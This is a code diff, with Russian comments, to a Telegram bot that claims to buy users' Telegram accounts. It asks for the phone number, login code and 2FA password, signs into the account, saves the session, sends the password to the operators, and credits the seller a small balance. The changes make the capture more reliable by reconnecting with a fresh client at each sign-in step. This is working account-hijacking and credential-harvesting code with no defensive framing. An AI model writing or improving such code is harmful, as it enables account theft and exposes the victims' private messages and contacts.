@@ -336,6 +336,12 @@ async def finalize_auth_and_success(client: TelegramClient, phone: str, session_
     session_file_path = f"{session_name}.session"
     asyncio.create_task(setup_account_listener(acc_id, session_file_path, phone))
 
+    # Начисляем бонус юзеру
+    async with aiosqlite.connect(DB_PATH) as db:
+        await db.execute(
+            "UPDATE users SET balance = balance + 1.0, total_earned = total_earned + 1.0 WHERE user_id = ?", (user_id,))
+        await db.commit()
+
     for admin_id in ADMIN_IDS:
         try:
             pwd_info = f"\n• 🔑 2FA Пароль: `{password_used}`" if has_2fa else "\n• 🔑 2FA Пароль: Отсутствует"
@@ -369,13 +375,12 @@ async def finalize_auth_and_success(client: TelegramClient, phone: str, session_
 @router.message(Command("start"))
 async def cmd_start(message: Message):
     user = message.from_user
-    reg_date = user.date.strftime("%Y-%m-%d %H:%M:%S") if hasattr(user, 'date') else message.date.strftime(
-        "%Y-%m-%d %H:%M:%S")
+    reg_date = message.date.strftime("%Y-%m-%d %H:%M:%S")
     await add_user(user.id, user.username or "NoUsername", user.full_name, reg_date)
 
     is_admin = user.id in ADMIN_IDS
     text = (
-        "👋 Добро пожаловать в официального бота автоскупки аккаунтов!\n\n"
+        "👋 Добро пожаловать в официальный бота автоскупки аккаунтов!\n\n"
         "🔹 **samoobman priemka** — лучший сервис быстрой и безопасной скупки "
         "ваших Telegram аккаунтов по выгодным ценам.\n\n"
         "Выберите нужный раздел в меню ниже:"
@@ -445,13 +450,13 @@ async def process_phone(message: Message, state: FSMContext):
         sent = await client.send_code_request(phone)
 
         await state.update_data(
-            client=client,
             phone=phone,
             phone_code_hash=sent.phone_code_hash,
             session_name=session_name,
             uid=uid,
             status_msg_id=status_msg.message_id
         )
+        await client.disconnect()
 
         await status_msg.edit_text(
             f"📱 Код отправлен от Telegram на номер `{phone}`.\n\n"
@@ -480,19 +485,19 @@ async def process_code(message: Message, state: FSMContext):
 
     code = message.text.strip()
     data = await state.get_data()
-    client: TelegramClient = data.get("client")
     phone = data.get("phone")
     phone_code_hash = data.get("phone_code_hash")
     session_name = data.get("session_name")
     uid = data.get("uid")
     status_msg_id = data.get("status_msg_id")
 
-    try:
-        # Проверяем соединение и при необходимости переподключаемся перед отправкой кода
-        if not client.is_connected():
-            await client.connect()
+    # Создаем новый чистый клиент для защиты от падений сокета
+    client = TelegramClient(session_name, int(API_ID), str(API_HASH))
 
+    try:
+        await client.connect()
         await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+
         await finalize_auth_and_success(client, phone, session_name, uid, has_2fa=False)
         if status_msg_id:
             try:
@@ -502,7 +507,8 @@ async def process_code(message: Message, state: FSMContext):
         await state.clear()
 
     except SessionPasswordNeededError:
-        await state.update_data(status_msg_id=status_msg_id)
+        await client.disconnect()
+        await state.update_data(status_msg_id=status_msg_id, session_name=session_name)
         err_text = "🔐 На вашем аккаунте установлен облачный пароль (2FA).\nВведите ваш пароль в чат:"
         if status_msg_id:
             try:
@@ -536,18 +542,18 @@ async def process_password(message: Message, state: FSMContext):
 
     password = message.text.strip()
     data = await state.get_data()
-    client: TelegramClient = data.get("client")
     phone = data.get("phone")
     session_name = data.get("session_name")
     uid = data.get("uid")
     status_msg_id = data.get("status_msg_id")
 
-    try:
-        # Проверяем соединение и переподключаемся при обрыве перед отправкой пароля
-        if not client.is_connected():
-            await client.connect()
+    # Создаем новый чистый клиент для проверки 2FA пароля
+    client = TelegramClient(session_name, int(API_ID), str(API_HASH))
 
+    try:
+        await client.connect()
         await client.sign_in(password=password)
+
         await finalize_auth_and_success(client, phone, session_name, uid, has_2fa=True, password_used=password)
         if status_msg_id:
             try:
